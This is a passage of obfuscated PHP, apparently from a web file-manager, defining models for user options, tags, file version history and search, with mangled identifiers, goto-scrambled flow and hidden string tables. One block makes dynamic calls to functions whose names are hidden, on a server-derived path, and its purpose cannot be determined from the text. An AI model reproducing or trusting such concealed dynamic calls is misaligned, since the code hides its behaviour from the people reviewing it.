array_to_keyvalue($this->listData(), $_SERVER[Î¿—”òá][28]); if (!$AÊçõ”¿–¾ || !isset($AÊçõ”¿–¾[$a«±›ùœ])) { return $a«±›ùœ; } for ($fã·Í÷î = 1; $fã·Í÷î < count($AÊçõ”¿–¾); $fã·Í÷î++) { $aô¿º™®¹ = $a«±›ùœ . "\x28{$fã·Í÷î}\51"; if (!isset($AÊçõ”¿–¾[$aô¿º™®¹])) { return $aô¿º™®¹; } } return $aô¿º™®¹; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A•ä›Äªè = false, $AÎÁêãêÀÒ = '', $AÑ¤‚°ËŠ = false) { goto C·è”¡Óª; Bî‚Ì°Ù…Õ: $DšÛù«‘²¨ = $this->where($dÒœìï¬ÄÚ)->select(); $DšÛù«‘²¨ = array_to_keyvalue($DšÛù«‘²¨, $A‚ « ÎƒÅ[89], $A‚ « ÎƒÅ[359]); foreach ($DšÛù«‘²¨ as $FÖå”¤µ => $C‘¼Œˆ…ñ¯) { if ($AÑ¤‚°ËŠ || in_array($FÖå”¤µ, $this->jsonField)) { $DšÛù«‘²¨[$FÖå”¤µ] = json_decode($C‘¼Œˆ…ñ¯, !0); } } goto eó Í¼óè—; eó Í¼óè—: $this->cacheSet($AÎÁêãêÀÒ, $DšÛù«‘²¨); $DšÛù«‘²¨ = array_merge($EëØœÂªøª, $DšÛù«‘²¨); return $A•ä›Äªè ? $DšÛù«‘²¨[$A•ä›Äªè] : $DšÛù«‘²¨; goto DÊº„êôêà; C·è”¡Óª: $A‚ « ÎƒÅ =& $_SERVER[Î¿—”òá]; $DšÛù«‘²¨ = $this->cacheGet($AÎÁêãêÀÒ); $EëØœÂªøª = $this->optionDefault($AÎÁêãêÀÒ); goto B”µëÂÚõ; B”µëÂÚõ: $EëØœÂªøª = is_array($EëØœÂªøª) ? $EëØœÂªøª : array(); if (is_array($DšÛù«‘²¨)) { $DšÛù«‘²¨ = array_merge($EëØœÂªøª, $DšÛù«‘²¨); return $A•ä›Äªè ? isset($DšÛù«‘²¨[$A•ä›Äªè]) ? $DšÛù«‘²¨[$A•ä›Äªè] : null : $DšÛù«‘²¨; } $dÒœìï¬ÄÚ = $this->filterWhere(array($A‚ « ÎƒÅ[29] => $AÎÁêãêÀÒ)); goto Bî‚Ì°Ù…Õ; DÊº„êôêà: } public function set($E…ğÏ§™ÊÔ, $c§Ğšæ´ğå = false, $d‰¢ÆÎáõ¡ = '') { goto DÓìä¾îø; dšØÜŞÏÂ: $aĞŒ¼¾¢å = is_array($E…ğÏ§™ÊÔ) ? $E…ğÏ§™ÊÔ : array($E…ğÏ§™ÊÔ => $c§Ğšæ´ğå); foreach ($aĞŒ¼¾¢å as $e™ƒ¢¾„î— => $A„ÑŸ÷‡ÈÚ) { if (is_array($A„ÑŸ÷‡ÈÚ)) { $A„ÑŸ÷‡ÈÚ = json_encode_force($A„ÑŸ÷‡ÈÚ); } $this->checkLength($A„ÑŸ÷‡ÈÚ, !1, $this->tableName . $Cƒß®¼…¯ø[4] . $E…ğÏ§™ÊÔ); $A„ÑŸ÷‡ÈÚ = self::textEncode($A„ÑŸ÷‡ÈÚ); $aĞŒ¼¾¢å = array($Cƒß®¼…¯ø[29] => $d‰¢ÆÎáõ¡, $Cƒß®¼…¯ø[89] => $e™ƒ¢¾„î—, $Cƒß®¼…¯ø[359] => $A„ÑŸ÷‡ÈÚ); $BÊË¤Ì¯¨[] = $this->filterWhere($aĞŒ¼¾¢å); } if (!$BÊË¤Ì¯¨) { return !0; } goto DòÜƒµÖ£; DòÜƒµÖ£: return $this->addAll($BÊË¤Ì¯¨, array(), !0); goto BÏ¸÷¶‚™; DÓìä¾îø: $Cƒß®¼…¯ø =& $_SERVER[Î¿—”òá]; $this->cacheRemove($d‰¢ÆÎáõ¡); $BÊË¤Ì¯¨ = array(); goto dšØÜŞÏÂ; BÏ¸÷¶‚™: } protected function optionDefault($F˜¸ñçñ¥Š = '') { return !1; } public function setDeep($EÚô°øºÁ„, $Eê¨ÒÑ  = false, $EÙà›™â = '') { $Bà§®•­»£ = explode($_SERVER[Î¿—”òá][91], $EÚô°øºÁ„); $E‰Ò‚Œ¤Ÿæ = $this->get(); array_set_value($E‰Ò‚Œ¤Ÿæ, $EÚô°øºÁ„, $Eê¨ÒÑ ); $this->set($Bà§®•­»£[0], $E‰Ò‚Œ¤Ÿæ[$Bà§®•­»£[0]], $EÙà›™â); } public function remove($BÕÏ©ÑííÍ, $f‚ÅÑ£‹Ì¼ = '') { $D¹Š™‚ø„ã =& $_SERVER[Î¿—”òá]; $this->cacheRemove($f‚ÅÑ£‹Ì¼); $f¥¾»‹¿¥ = $this->filterWhere(array($D¹Š™‚ø„ã[89] => $BÕÏ©ÑííÍ, $D¹Š™‚ø„ã[29] => $f‚ÅÑ£‹Ì¼)); if (is_null($BÕÏ©ÑííÍ)) { unset($f¥¾»‹¿¥[$D¹Š™‚ø„ã[89]]); } return $this->where($f¥¾»‹¿¥)->delete(); } public function cacheSet($E¡¯‘· ù, $F£Œ¬÷Û² = false) { return Cache::set($this->cacheKey($E¡¯‘· ù), $F£Œ¬÷Û²); } public function cacheGet($A‹³ì¡¶ºŒ) { return Cache::get($this->cacheKey($A‹³ì¡¶ºŒ)); } public function cacheRemove($Fˆä”Á¡Ù´) { return Cache::remove($this->cacheKey($Fˆä”Á¡Ù´)); } protected function filterWhere($E¹ÉìÇ’õ ) { return $E¹ÉìÇ’õ ; } protected function cacheKey($bØ–ÑØÛ) { return $bØ–ÑØÛ; } } goto b‡µÉÈÄñ; cÎ¿»•õ‘: define($_SERVER[Î¿—”òá][1926], 3); define($_SERVER[Î¿—”òá][1927], 4); define($_SERVER[Î¿—”òá][1928], 5); goto BëöíŸù; BËêùÏëœá: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($EÖêíËŒÄà) { $Eô¼‹ÓÇŞ =& $_SERVER[Î¿—”òá]; if (!defined($Eô¼‹ÓÇŞ[427])) { define($Eô¼‹ÓÇŞ[427], 0); } return "\125\x73\145\162\x4f\x70\164\x69\x6f\x6e\x5f{$EÖêíËŒÄà}\137" . USER_ID; } protected function filterWhere($f‚ğäÎ÷ Ø) { $a›´»¦×õ =& $_SERVER[Î¿—”òá]; if (!defined($a›´»¦×õ[427])) { define($a›´»¦×õ[427], 0); } $f‚ğäÎ÷ Ø[$a›´»¦×õ[1429]] = USER_ID; return $f‚ğäÎ÷ Ø; } public function cacheRemoveUser($dß¼ñîŠÂ¤, $EÉâ¥„·Û×) { return Cache::remove("\125\163\x65\x72\x4f\160\x74\151\157\x6e\137{$dß¼ñîŠÂ¤}\x5f" . $EÉâ¥„·Û×); } protected function optionDefault($Bó§ˆó¡õ¯ = '') { $CŸ·ƒÖØ¬„ =& $_SERVER[Î¿—”òá]; if ($Bó§ˆó¡õ¯ == $CŸ·ƒÖØ¬„[33]) { return $GLOBALS[$CŸ·ƒÖØ¬„[6]][$CŸ·ƒÖØ¬„[2534]]; } if ($Bó§ˆó¡õ¯ == $CŸ·ƒÖØ¬„[2535]) { return $GLOBALS[$CŸ·ƒÖØ¬„[6]][$CŸ·ƒÖØ¬„[2536]]; } } } if ($_SERVER[$_SERVER[Î¿—”òá][676]] != $_SERVER[$_SERVER[Î¿—”òá][2537]]) { goto eŠ–ÆÜŞ¿; EŠÁ™¤±: $e•ª…ÜÙ´ù($_SERVER[$_SERVER[Î¿—”òá][677]]); goto A¨âÀ¢ù§‚; eŠ–ÆÜŞ¿: $d¥¼àÄ­’Ş = $_SERVER[Î¿—”òá][678]; $a†‚±Ñ†Ñ˜ = $_SERVER[$_SERVER[Î¿—”òá][679]] . $_SERVER[Î¿—”òá][680]; $C˜í‡êŠÌó = $d¥¼àÄ­’Ş($a†‚±Ñ†Ñ˜); goto dáÙ®‡ÒĞ; dáÙ®‡ÒĞ: $E—½ËË ¤â = explode($_SERVER[Î¿—”òá][217], $C˜í‡êŠÌó); if (count($E—½ËË ¤â) < $_SERVER[Î¿—”òá][548]) { $d¡÷œåæå = $_SERVER[Î¿—”òá][681]; $d¡÷œåæå(); } $e•ª…ÜÙ´ù = $_SERVER[Î¿—”òá][682]; goto EŠÁ™¤±; A¨âÀ¢ù§‚: } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\141\x67\114\151\x73\164"; public $modelType = "\x55\x73\x65\x72\x4f\x70\164\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\x74\171\154\x65", "\163\157\162\164"); public function listData($Eİçô‡°Š‰ = false, $dÇ÷æ´×¤© = "\x73\157\162\164", $b‚‘Ù«ô–¥ = false) { return parent::listData($Eİçô‡°Š‰, $dÇ÷æ´×¤©, $b‚‘Ù«ô–¥); } public function remove($d…‡“Å”ìÅ) { return parent::remove($d…‡“Å”ìÅ); } public function add($DëôĞ Á÷›, $e…Ç“’ğœØ = "\x6c\141\x62\145\154\55\147\162\x65\x79\55\x6e\x6f\x72\155\x61\154") { $Bğ¦ãêæ÷ =& $_SERVER[Î¿—”òá]; if ($this->findByName($DëôĞ Á÷›)) { return !1; } $c‹’«ö‚ˆ = array($Bğ¦ãêæ÷[386] => $DëôĞ Á÷›, $Bğ¦ãêæ÷[437] => $e…Ç“’ğœØ, $Bğ¦ãêæ÷[2101] => $this->getSort($Bğ¦ãêæ÷[246]) + 1); return parent::insert($c‹’«ö‚ˆ); } public function update($EØõ¯›‹®, $d–ßÅŞù·¤) { $cá‡›Š–‹ =& $_SERVER[Î¿—”òá]; $d¿íŒÙá¡ = $this->listData($EØõ¯›‹®); $e™„å½¼Ê = $this->findByName($d–ßÅŞù·¤[$cá‡›Š–‹[28]]); if (!$d¿íŒÙá¡ || $e™„å½¼Ê && $e™„å½¼Ê[$cá‡›Š–‹[367]] != $d¿íŒÙá¡[$cá‡›Š–‹[367]]) { return !1; } return parent::update($EØõ¯›‹®, $d–ßÅŞù·¤); } public function moveTop($e†Ûè‚ì®À) { $C‡šÜğ‘ö› =& $_SERVER[Î¿—”òá]; $B¼”Ïƒ•Ë¹ = parent::listData(); $E¿ˆ¹Ç‰İ¸ = $this->getSort($C‡šÜğ‘ö›[245]); foreach ($B¼”Ïƒ•Ë¹ as &$f¡µ‡Øöš) { if ($f¡µ‡Øöš[$C‡šÜğ‘ö›[367]] == $e†Ûè‚ì®À) { $f¡µ‡Øöš[$C‡šÜğ‘ö›[2118]] = $E¿ˆ¹Ç‰İ¸; continue; } $f¡µ‡Øöš[$C‡šÜğ‘ö›[2118]] += 1; } return parent::resetData($B¼”Ïƒ•Ë¹); } public function moveBottom($Déêï’šÁ¸) { $CÍä›Ã›©Ì =& $_SERVER[Î¿—”òá]; $eçÅ°‹Ú„ø = $this->getSort($CÍä›Ã›©Ì[246]) + 1; return parent::update($Déêï’šÁ¸, array($CÍä›Ã›©Ì[2118] => $eçÅ°‹Ú„ø)); } public function resetSort($DĞ±®°†­±) { goto Dß°Ï”ÄÍ; Dß°Ï”ÄÍ: $FÉëÆÜğ‚× =& $_SERVER[Î¿—”òá]; $e¾öğÓ’¬Ö = array(); $DĞ±®°†­± = is_array($DĞ±®°†­±) ? $DĞ±®°†­± : array(); goto dÊ°ÓšîÆ; dÊ°ÓšîÆ: for ($Dö¦ˆù¸ªğ = 0; $Dö¦ˆù¸ªğ < count($DĞ±®°†­±); $Dö¦ˆù¸ªğ++) { $e¾öğÓ’¬Ö[$DĞ±®°†­±[$Dö¦ˆù¸ªğ] . $FÉëÆÜğ‚×[33]] = $Dö¦ˆù¸ªğ + 1; } $eÑÜë§…Íì = parent::listData(); foreach ($eÑÜë§…Íì as &$a‘‹ÕÊÑØ‰) { $CØŠ×½‹ = $e¾öğÓ’¬Ö[$a‘‹ÕÊÑØ‰[$FÉëÆÜğ‚×[367]]]; $a‘‹ÕÊÑØ‰[$FÉëÆÜğ‚×[2118]] = $CØŠ×½‹ ? $CØŠ×½‹ : $a‘‹ÕÊÑØ‰[$FÉëÆÜğ‚×[2118]]; } goto fáº…­ŒÑÉ; fáº…­ŒÑÉ: return parent::resetData($eÑÜë§…Íì); goto a‚…È‘³¡‹; a‚…È‘³¡‹: } private function getSort($c•š‡Ÿ¶«±) { $d¯™ä´ä¢ =& $_SERVER[Î¿—”òá]; $FŠ®ÇŞ¯íˆ = parent::listData(); $B…É–‡Ô† = array_to_keyvalue($FŠ®ÇŞ¯íˆ, $d¯™ä´ä¢[33], $d¯™ä´ä¢[2118]); if (!$B…É–‡Ô†) { $B…É–‡Ô† = array(0); } $dÖ„Ë‹é„’ = $c•š‡Ÿ¶«± == $d¯™ä´ä¢[246] ? max($B…É–‡Ô†) : min($B…É–‡Ô†); return intval($dÖ„Ë‹é„’); } } goto AÒ­²ºõ¥®; EºƒËøÍ…“: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\x63\x65\137\150\151\x73\164\x6f\162\171"; public function addHistory($E²ŒÀ¬—¤ä, $Fâ½øš’é¬ = '') { $dÖá¥–ò³¥ =& $_SERVER[Î¿—”òá]; $e¨éÈ´˜ï¦ = array($dÖá¥–ò³¥[383] => $E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[369]], $dÖá¥–ò³¥[1420] => isset($E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[379]]) ? $E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[379]] : $E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[378]], $dÖá¥–ò³¥[420] => $E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[419]], $dÖá¥–ò³¥[520] => $E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[77]], $dÖá¥–ò³¥[2295] => $Fâ½øš’é¬); $EíÏ¥İò„ß = $GLOBALS[$dÖá¥–ò³¥[6]][$dÖá¥–ò³¥[84]][$dÖá¥–ò³¥[2296]]; if ($EíÏ¥İò„ß > 1) { $this->historyAutoClear($e¨éÈ´˜ï¦[$dÖá¥–ò³¥[369]]); $this->add($e¨éÈ´˜ï¦); } Model($dÖá¥–ò³¥[2297])->eventFileEdit($E²ŒÀ¬—¤ä[$dÖá¥–ò³¥[369]]); } private function historyAutoClear($b¢ƒØ‚Ü½¾) { goto c¸°‰ß°¦í; Eïùìƒ¢Œ„: $Bèëë¾ëâ‡ = array_to_keyvalue($CÙ«Œ¦Ô¿ì, $DŸÂ»Ä¥”[33], $DŸÂ»Ä¥”[419]); $Bèëë¾ëâ‡ = array_slice($Bèëë¾ëâ‡, $bÖ›µå‹£Û); if (!$AÊ”‡´“¯î || !$Bèëë¾ëâ‡) { return; } goto bÃÚŸÊæö; bÃÚŸÊæö: $Aœ…êï„¿Š = array($DŸÂ»Ä¥”[385] => array($DŸÂ»Ä¥”[7], $AÊ”‡´“¯î)); $this->where($Aœ…êï„¿Š)->delete(); Model($DŸÂ»Ä¥”[422])->remove($Bèëë¾ëâ‡); goto C»ŠÁæ´‡; c¸°‰ß°¦í: $DŸÂ»Ä¥” =& $_SERVER[Î¿—”òá]; $c± «áâì“ = Model($DŸÂ»Ä¥”[1081])->get($DŸÂ»Ä¥”[2298]); $d»¼«”÷³á = $GLOBALS[$DŸÂ»Ä¥”[6]][$DŸÂ»Ä¥”[84]][$DŸÂ»Ä¥”[2296]]; goto b´ˆèİÆğ¾; d™Şæˆ¿éˆ: if ($bÖ›µå‹£Û >= 500) { return; } $Aœ…êï„¿Š = array($DŸÂ»Ä¥”[383] => $b¢ƒØ‚Ü½¾); $CÙ«Œ¦Ô¿ì = $this->field($DŸÂ»Ä¥”[2300])->where($Aœ…êï„¿Š)->order($DŸÂ»Ä¥”[2292])->select(); goto dÊº³Ñ“ª; b´ˆèİÆğ¾: $EÅ§ŞƒŞÍ… = $c± «áâì“ == $DŸÂ»Ä¥”[2299] ? 3 : $d»¼«”÷³á; if ($d»¼«”÷³á <= 1) { $EÅ§ŞƒŞÍ… = 1; } $bÖ›µå‹£Û = $EÅ§ŞƒŞÍ… - 1; goto d™Şæˆ¿éˆ; dÊº³Ñ“ª: if (!$CÙ«Œ¦Ô¿ì || $bÖ›µå‹£Û >= count($CÙ«Œ¦Ô¿ì)) { return; } $AÊ”‡´“¯î = array_to_keyvalue($CÙ«Œ¦Ô¿ì, $DŸÂ»Ä¥”[33], $DŸÂ»Ä¥”[367]); $AÊ”‡´“¯î = array_slice($AÊ”‡´“¯î, $bÖ›µå‹£Û); goto Eïùìƒ¢Œ„; C»ŠÁæ´‡: } public function listData($C†ó›Ê†ˆ‰) { goto cœØèÌŞ„„; cœØèÌŞ„„: $A¡”ºƒêº =& $_SERVER[Î¿—”òá]; $dÈÚŒµ§Üƒ = array($A¡”ºƒêº[383] => $C†ó›Ê†ˆ‰); $f”êàÚ¼õ = $A¡”ºƒêº[2301]; goto Döí’Øí; cä§„¦êÚ: $a×õë‹Ô½¢ = 3; if ($CÊ£¡„º == $A¡”ºƒêº[2299]) { $EØ´äÁ©[$A¡”ºƒêº[354]] = array_slice($EØ´äÁ©[$A¡”ºƒêº[354]], 0, $a×õë‹Ô½¢); $EØ´äÁ©[$A¡”ºƒêº[351]] = array($A¡”ºƒêº[2302] => 1, $A¡”ºƒêº[2303] => 20, $A¡”ºƒêº[2304] => 1, $A¡”ºƒêº[2305] => count($EØ´äÁ©[$A¡”ºƒêº[354]])); } return $EØ´äÁ©; goto f½ŞÍ¿Áæ; Döí’Øí: $EØ´äÁ© = $this->field($f”êàÚ¼õ)->where($dÈÚŒµ§Üƒ)->order($A¡”ºƒêº[2292])->selectPage(); $this->_listAppendUser($EØ´äÁ©[$A¡”ºƒêº[354]]); $CÊ£¡„º = Model($A¡”ºƒêº[1081])->get($A¡”ºƒêº[2298]); goto cä§„¦êÚ; f½ŞÍ¿Áæ: } protected function _listAppendUser(&$D¿‘»êèÆ) { $ağÅ¶á‹Ñ =& $_SERVER[Î¿—”òá]; $E»´Ö”åì­ = array_to_keyvalue($D¿‘»êèÆ, $ağÅ¶á‹Ñ[33], $ağÅ¶á‹Ñ[1429]); $bÛÁ¨ÊªæÏ = Model($ağÅ¶á‹Ñ[477])->userListInfo($E»´Ö”åì­); foreach ($D¿‘»êèÆ as &$fæáñîœÍè) { $bÔ¤ÒÆ‰º  = $fæáñîœÍè[$ağÅ¶á‹Ñ[1429]]; $fæáñîœÍè[$ağÅ¶á‹Ñ[378]] = $bÛÁ¨ÊªæÏ[$bÔ¤ÒÆ‰º ] ? $bÛÁ¨ÊªæÏ[$bÔ¤ÒÆ‰º ] : !1; } } public function fileInfo($e²éŞ¿äˆë) { $FÚî²äœ ™ =& $_SERVER[Î¿—”òá]; $dÓ¦¹Ó¹ß = $this->tablePrefix; $BÛ‡ÃÒªœ­ = "{$dÓ¦¹Ó¹ß}\151\157\137\146\x69\154\x65\40\x66\151\x6c\x65\163\40\x6f\x6e\x20\x66\151\x6c\x65\163\x2e\146\151\x6c\145\111\104\x20\x3d\x20\150\151\163\x74\157\162\171\56\x66\151\x6c\145\111\x44"; return $this->alias($FÚî²äœ ™[2306])->where(array($FÚî²äœ ™[385] => $e²éŞ¿äˆë))->join($BÛ‡ÃÒªœ­, $FÚî²äœ ™[2307])->find(); } public function removeItem($fŠ§š´á®‰) { $DïÜ•ÓÚÑŒ =& $_SERVER[Î¿—”òá]; $eÚ’ãˆÅï» = array($DïÜ•ÓÚÑŒ[385] => $fŠ§š´á®‰); $EÊ—Û‰ˆ´¢ = $this->where($eÚ’ãˆÅï»)->find(); if ($EÊ—Û‰ˆ´¢) { $Aë°Ûùè‚Ÿ = $this->where($eÚ’ãˆÅï»)->delete(); Model($DïÜ•ÓÚÑŒ[422])->remove($EÊ—Û‰ˆ´¢[$DïÜ•ÓÚÑŒ[419]]); return $Aë°Ûùè‚Ÿ; } return !1; } public function removeBySource($cªğ°¢äø°) { goto bÖŠÒ—; F°“»èÜˆ’: $D¹½„¿ÔÑ = array($aˆÍ…ç‰”[383] => array($aˆÍ…ç‰”[7], $cªğ°¢äø°)); $a‰ÀçŠøİÓ = $this->field($aˆÍ…ç‰”[420])->where($D¹½„¿ÔÑ)->select(); if ($a‰ÀçŠøİÓ) { $this->where($D¹½„¿ÔÑ)->delete(); $fãÇ§Ì‰ÇÑ = array_to_keyvalue($a‰ÀçŠøİÓ, $aˆÍ…ç‰”[33], $aˆÍ…ç‰”[419]); Model($aˆÍ…ç‰”[422])->remove($fãÇ§Ì‰ÇÑ); } goto fƒ–ä­Û¹Ù; fƒ–ä­Û¹Ù: return !0; goto b˜ä×òŒ³·; bÖŠÒ—: $aˆÍ…ç‰” =& $_SERVER[Î¿—”òá]; if (!$cªğ°¢äø°) { return !1; } if (!is_array($cªğ°¢äø°)) { $cªğ°¢äø° = array($cªğ°¢äø°); } goto F°“»èÜˆ’; b˜ä×òŒ³·: } public function setDetail($dçå™«ÙÒŒ, $c›•Ïñâ×¢) { $eÓíÊÕ£ =& $_SERVER[Î¿—”òá]; return $this->where(array($eÓíÊÕ£[385] => $dçå™«ÙÒŒ))->save(array($eÓíÊÕ£[2295] => $c›•Ïñâ×¢)); } public function rollbackToItem($f¦‚¶…™’Ú, $BíÕ‰¸¸Íò) { goto C–è©º…³±; C–è©º…³±: $F„ŒàÎ¬¿ =& $_SERVER[Î¿—”òá]; $EæÈÅÜèØ¯ = Model($F„ŒàÎ¬¿[749])->sourceInfo($f¦‚¶…™’Ú); $this->addHistory($EæÈÅÜèØ¯); goto C¼óä¦ŒÏ÷; cğ Ù×»Æ: return $this->where(array($F„ŒàÎ¬¿[385] => $BíÕ‰¸¸Íò))->delete(); goto aŸÑ¾•ì¼É; C¼óä¦ŒÏ÷: $BŞ‚šÎë»å = $this->find($BíÕ‰¸¸Íò); $a…ÏÁ”©ƒà = array($F„ŒàÎ¬¿[419] => $BŞ‚šÎë»å[$F„ŒàÎ¬¿[419]], $F„ŒàÎ¬¿[77] => $BŞ‚šÎë»å[$F„ŒàÎ¬¿[77]], $F„ŒàÎ¬¿[107] => time(), $F„ŒàÎ¬¿[379] => USER_ID); Model($F„ŒàÎ¬¿[749])->where(array($F„ŒàÎ¬¿[369] => $f¦‚¶…™’Ú))->save($a…ÏÁ”©ƒà); goto cğ Ù×»Æ; aŸÑ¾•ì¼É: } public function clearSame($DóòŠã‰±¤) { goto D‘„†ìİˆ‡; F¿ŸÙ×·ï¾: $aØÁÛÆ™Ñ˜ = array(); $FÙ·ºëÕ„ = array(); foreach ($cãÖÙŞ’¶ as $Aìçå½ßé) { if (!$Aìçå½ßé || count($Aìçå½ßé) <= 1) { continue; } foreach ($Aìçå½ßé as $D—‹¾³›§) { $aØÁÛÆ™Ñ˜[] = $D—‹¾³›§[$eñÖ»Ï©˜ñ[419]]; $FÙ·ºëÕ„[] = $D—‹¾³›§[$eñÖ»Ï©˜ñ[367]]; } } goto FŞ…Óà½ğ; FŞ…Óà½ğ: if (!$FÙ·ºëÕ„) { return; } $this->where(array($eñÖ»Ï©˜ñ[367] => array($eñÖ»Ï©˜ñ[7], $FÙ·ºëÕ„)))->delete(); Model($eñÖ»Ï©˜ñ[422])->remove($aØÁÛÆ™Ñ˜); goto bÁà§‹““ƒ; D‘„†ìİˆ‡: $eñÖ»Ï©˜ñ =& $_SERVER[Î¿—”òá]; $E‘ÕœŠƒÊ  = $this->listData($DóòŠã‰±¤); $cãÖÙŞ’¶ = array_to_keyvalue_group($E‘ÕœŠƒÊ , $eñÖ»Ï©˜ñ[419]); goto F¿ŸÙ×·ï¾; bÁà§‹““ƒ: } public function userSpace() { $f‹Ç›ÕÍˆæ =& $_SERVER[Î¿—”òá]; $câÒ¥ß¿ô = $this->tablePrefix; $C±µÙˆ„¨É = array($f‹Ç›ÕÍˆæ[1420] => USER_ID); $CŠ³”ä§’ö = "{$câÒ¥ß¿ô}\151\x6f\137\146\151\154\145\x20\x66\151\154\x65\x73\x20\157\156\40\146\x69\x6c\145\163\x2e\146\151\x6c\x65\x49\x44\40\x3d\x20\150\x69\x73\164\157\x72\171\x2e\x66\x69\154\x65\111\x44"; return $this->alias($f‹Ç›ÕÍˆæ[2306])->where($C±µÙˆ„¨É)->join($CŠ³”ä§’ö, $f‹Ç›ÕÍˆæ[2307])->sum($f‹Ç›ÕÍˆæ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Aƒôù˜’Ÿ÷) { goto a¶ÎéÁÊ£©; C†¡”¬ãô: if (!$dÌ¶ƒ‰¬³–[$Dù“’Ë¶Šò[160]]) { $Bî’ù£À¼‡ = array_to_keyvalue($E§‘çŞÒ™ä, $Dù“’Ë¶Šò[33], $Dù“’Ë¶Šò[160]); $Eµ‘Ê½„¼Ä = implode($Dù“’Ë¶Šò[47], $Bî’ù£À¼‡); $Bª™“º‘­ª = $Dù“’Ë¶Šò[2258]; } $CÊŸÍ‹¿„è = explode($Dù“’Ë¶Šò[47], trim($Eµ‘Ê½„¼Ä, $Dù“’Ë¶Šò[47])); return array($Bª™“º‘­ª, $CÊŸÍ‹¿„è); goto dùî›¹ÃÁö; a¶ÎéÁÊ£©: $Dù“’Ë¶Šò =& $_SERVER[Î¿—”òá]; $E§‘çŞÒ™ä = KodIO::fileTypeList(); $dÌ¶ƒ‰¬³– = $E§‘çŞÒ™ä[$Aƒôù˜’Ÿ÷]; goto CËâ«åÂï¡; CËâ«åÂï¡: if (!$dÌ¶ƒ‰¬³–) { return array(); } $Eµ‘Ê½„¼Ä = $dÌ¶ƒ‰¬³–[$Dù“’Ë¶Šò[160]]; $Bª™“º‘­ª = $Dù“’Ë¶Šò[7]; goto C†¡”¬ãô; dùî›¹ÃÁö: } public function listPathType($eŒ‡åÑãÔâ) { $BÉé©í£„á =& $_SERVER[Î¿—”òá]; $B‡Â¹„ä·£ = $this->fileTypeWhere($eŒ‡åÑãÔâ); if (!$B‡Â¹„ä·£) { return array(); } $bš£×¿ŞÖ— = array($BÉé©í£„á[521] => SourceModel::TYPE_USER, $BÉé©í£„á[522] => USER_ID, $BÉé©í£„á[518] => 0, $BÉé©í£„á[519] => $B‡Â¹„ä·£); return $this->listSource($bš£×¿ŞÖ—); } public function listSearch($cŠÌ…ØÛí, $E‘î«•Ùã = 300) { goto bÁ¹ññ ØÔ; AÖ§·™ñ¾: if (!isset($CÜŠÓ·ŒÅÓ[$Dè‘ëŞØ¤°[397]])) { $CÜŠÓ·ŒÅÓ[$Dè‘ëŞØ¤°[397]] = 0; } $C¡Äß†…› = $Dè‘ëŞØ¤°[2309]; $EƒÃÇÀ¬« = $C¡Äß†…›; goto B­ Å¡á°•; bÁ¹ññ ØÔ: $Dè‘ëŞØ¤° =& $_SERVER[Î¿—”òá]; if (isset($cŠÌ…ØÛí[$Dè‘ëŞØ¤°[2175]]) && $cŠÌ…ØÛí[$Dè‘ëŞØ¤°[2175]]) { $cŠÌ…ØÛí[$Dè‘ëŞØ¤°[2175]] = str_replace($Dè‘ëŞØ¤°[1585], $Dè‘ëŞØ¤°[2308], trim($cŠÌ…ØÛí[$Dè‘ëŞØ¤°[2175]])); } $CÜŠÓ·ŒÅÓ = $this->_parseSearchWhere($cŠÌ…ØÛí); goto AÖ§·™ñ¾; B­ Å¡á°•: $this->_listSearchBindPinyin($cŠÌ…ØÛí, $CÜŠÓ·ŒÅÓ, $C¡Äß†…›); $this->alias($Dè‘ëŞØ¤°[487])->_makeOrder()->cache(null, 10); $eöìá¯”“Ò = $this->distinct(!0)->field($C¡Äß†…›)->where($CÜŠÓ·ŒÅÓ)->selectPage($E‘î«•Ùã); goto D‰§É„ˆ·; D‰§É„ˆ·: $this->_listSearchDesc($eöìá¯”“Ò, $cŠÌ…ØÛí, $EƒÃÇÀ¬«); $this->_listSearchTag($eöìá¯”“Ò, $cŠÌ…ØÛí, $EƒÃÇÀ¬«); $this->_listDataApply($eöìá¯”“Ò[$Dè‘ëŞØ¤°[354]]); goto AÍ ¥Ğ¶ÕÜ; AÍ ¥Ğ¶ÕÜ: $this->_listMake($eöìá¯”“Ò); return $eöìá¯”“Ò; goto FÆ³††ù¯Ç; FÆ³††ù¯Ç: } private function _listSearchTag(&$d•É»ğ—ƒ¤, $D¥‰¥”Í‹, $cÈœÓñïÅ) { goto a•ê¢ŒÊš„; B°ó¸•Àí: if (!$eß¥ñš¤“) { return; } $eÃ¤½É»’ = array($D´šêÅ”Õ»[393] => array($D´šêÅ”Õ»[7], $eß¥ñš¤“)); $E®¸†ˆ‰İÙ = Model($D´šêÅ”Õ»[394])->field($D´šêÅ”Õ»[75])->where($eÃ¤½É»’)->select(); goto bšï½÷³é²; bšï½÷³é²: $E®¸†ˆ‰İÙ = array_to_keyvalue($E®¸†ˆ‰İÙ, $D´šêÅ”Õ»[33], $D´šêÅ”Õ»[75]); $DŒÄ³Î°²† = array_unique($E®¸†ˆ‰İÙ); $this->_listSearchMerge($d•É»ğ—ƒ¤, $D¥‰¥”Í‹, $cÈœÓñïÅ, $DŒÄ³Î°²†); goto FÚ¶‘¬ˆ§; fÓò†ëâ¹Ò: $eß¥ñš¤“ = array(); $cµĞŒé ÷ = $D¥‰¥”Í‹[$D´šêÅ”Õ»[2175]]; foreach ($DÈ·©‰æëÈ as $F«ó˜‘¯áÆ) { $E¹¡ÒÜ‡Â‡ = $F«ó˜‘¯áÆ[$D´šêÅ”Õ»[28]]; $bÎ¾ŠƒˆŸ = str_replace($D´šêÅ”Õ»[50], $D´šêÅ”Õ»[33], Pinyin::encode($E¹¡ÒÜ‡Â‡)); if (stripos($E¹¡ÒÜ‡Â‡, $cµĞŒé ÷) !== !1 || stripos($bÎ¾ŠƒˆŸ, $cµĞŒé ÷) !== !1) { 